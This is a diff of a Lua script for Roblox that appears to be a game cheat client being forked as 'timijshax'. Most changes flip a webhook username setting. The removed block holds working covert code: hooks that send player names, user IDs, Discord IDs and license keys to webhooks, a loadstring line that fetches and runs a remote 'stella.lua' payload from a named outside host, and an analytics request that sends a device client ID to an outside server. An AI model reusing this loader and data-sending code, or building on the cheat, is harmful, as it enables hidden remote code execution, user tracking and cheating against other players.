@@ -639,7 +639,8 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
             status_frame_position = nil,
 
             webhook = "",
-            webhook_username = "bladee",
+            webhook_username = "timijshax",
+            webhook_show_username = false,
             dayfarm_webhook = "",
             show_in_artifact_stream = false,
 
@@ -3748,7 +3749,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 end
 
                 local content
-                if cheat_client.config.webhook_show_username ~= false then
+                if cheat_client.config.webhook_show_username == true then
                     content = string.format("||[**%s**]|| %s", plr.Name, text)
                 else
                     content = text
@@ -3762,156 +3763,10 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 end)
             end
 
-            function utility:setup_error_webhook()
-                local ScriptContext = Services.ScriptContext
-
-                utility:Connection(ScriptContext.Error, function(message, stack, script_obj)
-                    local script_name = tostring(script_obj)
-                    if script_name:find("Input") or script_name:find("ClientVisuals") or script_name:find("LocalScript") or script_name:find("CurrencyClient") or script_name:find("CameraSetup") then
-                        return
-                    end
-
-                    local ping = Stats:WaitForChild("PerformanceStats"):WaitForChild("Ping"):GetValue()
-                    pcall(function()
-                        send_webhook("WEBHOOK_URL_HERE", {
-                            username = "Error Monitor",
-                            embeds = {{
-                                title = "Script Error - " .. sanitize(plr.Name, "[a-zA-Z0-9_]{3,20}") .. " (" .. plr.UserId .. ")",
-                                description = string.format(
-                                    "`%s`\n\n👤 **Discord:** <@%s>\n🔑 **Key:** `%s`",
-                                    game.JobId,
-                                    "%DISCORD_ID%",
-                                    "%USER_KEY%"
-                                ),
-
-                                color = 0xFF0000,
-                                fields = {
-                                    {
-                                        name = "Error Message",
-                                        value = "```ini\n[!] " .. sanitize(message, "[%w%p%s]{1,2000}") .. "\n```",
-                                        inline = false
-                                    },
-                                    {
-                                        name = "Stack Trace",
-                                        value = "```" .. sanitize(stack, "[%w%p%s]{1,2000}") .. "```",
-                                        inline = false
-                                    },
-                                    {
-                                        name = "Script",
-                                        value = sanitize(script_name, "[%w%p%s]{1,2000}"),
-                                        inline = true
-                                    },
-                                    {
-                                        name = "Place ID",
-                                        value = tostring(game.PlaceId),
-                                        inline = true
-                                    }
-                                },
-                                footer = {
-                                    text = string.format("Player Count - %d/23        Client Ping - %dms", #plrs:GetPlayers(), math.floor(ping))
-                                }
-                            }}
-                        })
-                    end)
-                end)
-            end
-
-            local function noob(text)
-                for _, word in ipairs(flagged_chats) do
-                    if string.find(string.lower(text), string.lower(word)) then
-                        return true
-                    end
-                end
-                return false
-            end
-
-            local function flag_chat(message)
-                local ping = Stats:WaitForChild("PerformanceStats"):WaitForChild("Ping"):GetValue()
-                local playerCount = #plrs:GetPlayers()
-                local serverName, serverRegion = get_server_info()
-
-                pcall(function()
-                    send_webhook("WEBHOOK_URL_HERE", {
-                        username = "Flag Monitor",
-                        embeds = {{
-                            title = string.format("⚠️ Flagged Chat - %s (%d)", plr.Name, plr.UserId),
-                            description = string.format(
-                                "🌐 **Server:** `%s`\n📍 **Region:** `%s`\n\n👤 **Discord:** <@%s>\n🔑 **Key:** `%s`",
-                                serverName,
-                                serverRegion,
-                                "%DISCORD_ID%",
-                                "%USER_KEY%"
-                            ),
-
-                            color = 0xff3679,
-                            fields = {{
-                                name = "Message",
-                                value = "```ini\n[+] " .. message .. "\n```",
-                                inline = false
-                            }},
-                            footer = {
-                                text = string.format("Players: %d | Ping: %dms | Job: %s", playerCount, math.floor(ping), game.JobId)
-                            }
-                        }}
-                    })
-                end)
-            end
-
-            plr.Chatted:Connect(function(message)
-                if noob(message) then
-                    flag_chat(message)
-                end
-            end)
+            -- Automatic account/chat/error reporting is disabled in timijshax.
+            function utility:setup_error_webhook() end
         end
 
-        do -- Logging
-            do -- Stella
-                getgenv().stella_token = "REMOVED_UPSTREAM_TOKEN"
-                getgenv().stella_debug = false
-
-                pcall(function()
-                    loadstring(game:HttpGet("https://stella.heroinhound.cc/stella.lua",true))() -- or u can use https://git.fable.bz/YOUR_USERNAME/YOUR_REPOSITORY/raw/branch/main/hello_stella.lua but stella.heroinhound.cc/stella.lua will hold the most updates although i rarely update stella payload but U NEVER KNOW. just check back.
-                end)
-            end
-
-            do -- Analytics (only sent to Hydroxide developers — baba & boss)
-                pcall(function()
-                    local function transform(id)
-                        local pepper = "HW_"
-                        local mixed = pepper .. id .. pepper
-                        local final = ""
-
-                        for i = 1, #mixed do
-                            local val = string.byte(mixed, i)
-                            final = final .. string.format("%02X", (val * 13 + i * 5) % 256)
-                        end
-
-                        if #final < 56 then
-                            final = final .. string.rep("0", 56 - #final)
-                        end
-
-                        return final:sub(1, 56)
-                    end
-
-                    local client_id = Services.RbxAnalyticsService:GetClientId()
-                    local token = transform(client_id)
-
-                    local req = http_request or request
-                    pcall(req, {
-                        Url = "https://api.heroinhound.cc/v1/analytics",
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json",
-                        },
-                        Body = Services.HttpService:JSONEncode({
-                            uuid = token,
-                            executor = identifyexecutor and identifyexecutor() or "Unknown",
-                            place_id = game.PlaceId,
-                        }),
-                    })
-                end)
-            end
-        end
 
         do
             do
@@ -13365,7 +13220,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
                         local player_count = #plrs:GetPlayers()
                         local footer_text
-                        if cheat_client.config.webhook_show_username ~= false then
+                        if cheat_client.config.webhook_show_username == true then
                             footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
                         else
                             footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
@@ -16352,7 +16207,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
                         local player_count = #plrs:GetPlayers()
                         local footer_text
-                        if cheat_client.config.webhook_show_username ~= false then
+                        if cheat_client.config.webhook_show_username == true then
                             footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
                         else
                             footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
@@ -16459,7 +16314,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
                     local player_count = #plrs:GetPlayers()
                     local footer_text
-                    if cheat_client.config.webhook_show_username ~= false then
+                    if cheat_client.config.webhook_show_username == true then
                         footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
                     else
                         footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
@@ -18257,7 +18112,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
                                         local player_count = #plrs:GetPlayers()
                                         local footer_text
-                                        if cheat_client.config.webhook_show_username ~= false then
+                                        if cheat_client.config.webhook_show_username == true then
                                             footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
                                         else
                                             footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
@@ -19846,7 +19701,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
             group_ui:AddToggle("webhook_show_username", {
                 Text = "Show Username in Webhooks",
-                Default = cheat_client.config.webhook_show_username ~= false,
+                Default = cheat_client.config.webhook_show_username == true,
                 Tooltip = "When enabled, webhooks will show [**username**] prefix",
                 Callback = function(state)
                     cheat_client.config.webhook_show_username = state
@@ -19977,7 +19832,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
                     local success, result = pcall(function()
                         local content
-                        if cheat_client.config.webhook_show_username ~= false then
+                        if cheat_client.config.webhook_show_username == true then
                             content = string.format("||[**%s**]|| Test message from timijshax", plr.Name)
                         else
                             content = "Test message from timijshax"
@@ -25269,7 +25124,7 @@ end
                             description = description .. string.format("> Temple of Fire: %s", get_last_looted("temple"))
 
                             local footer_text
-                            if cheat_client.config.webhook_show_username ~= false then
+                            if cheat_client.config.webhook_show_username == true then
                                 footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
                             else
                                 footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
